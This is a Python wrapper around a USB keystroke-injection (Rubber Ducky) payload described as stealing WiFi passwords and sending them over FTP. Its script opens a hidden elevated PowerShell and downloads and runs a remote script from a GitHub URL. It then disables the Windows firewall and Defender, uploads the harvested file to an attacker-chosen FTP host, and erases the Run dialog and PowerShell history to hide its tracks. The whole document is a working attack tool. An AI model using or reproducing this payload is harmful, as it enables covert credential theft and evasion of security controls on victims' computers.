class info:
    author="n0nuser"
    description = "Retrieves WiFi passwords ands sends them via FTP"
    function = "Data Exfiltration"
    parameters = [ "IP", "PORT", "USERNAME", "PASSWORD" ]
    content = """\
DELAY 3000
GUI r
DELAY 400
STRING powershell Start-Process powershell -verb runAs
ENTER
DELAY 750
LEFT
DELAY 750
ENTER
DELAY 750
STRING [console]::WindowWidth=100; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth=1
ENTER
DELAY 750

STRING $date = Get-Date -UFormat %d-%m-%y
ENTER
DELAY 750
STRING $filename = $env:UserName + "_" + $date + ".txt"
ENTER
DELAY 500

STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/debianfreak47/Powershell_Scripts/master/pwner.ps1'); pwner >> $filename
ENTER
DELAY 1000

STRING netsh advfirewall set allprofiles state off;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableBehaviorMonitoring 1;Set-MpPreference -DisableOnAccessProtection 1;Set-MpPreference -DisableScanOnRealtimeEnable 1;Set-MpPreference -PUAProtection 0;Gpupdate /Force
ENTER
DELAY 3000

STRING echo \"o\" > tmp.txt; echo \"IP PORT\" >> tmp.txt; echo \"USERNAME\" >> tmp.txt; echo \"PASSWORD\" >> tmp.txt; echo \"put $filename\" >> tmp.txt"
ENTER
DELAY 1500
STRING ftp -s:tmp.txt
ENTER
DELAY 3000
STRING quit
ENTER
DELAY 750
STRING del $filename;del tmp.txt
ENTER
DELAY 500
STRING clear
ENTER
DELAY 500

STRING netsh advfirewall set allprofiles state on;Set-MpPreference -DisableRealtimeMonitoring 0;Set-MpPreference -DisableBehaviorMonitoring 0;Set-MpPreference -DisableOnAccessProtection 0;Set-MpPreference -DisableScanOnRealtimeEnable 0;Set-MpPreference -PUAProtection 1;Gpupdate /Force
ENTER
DELAY 3000

STRING Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue
ENTER
DELAY 1000
STRING Clear-History; rm (Get-PSReadlineOption).HistorySavePath
ENTER
DELAY 750

STRING exit
ENTER\
"""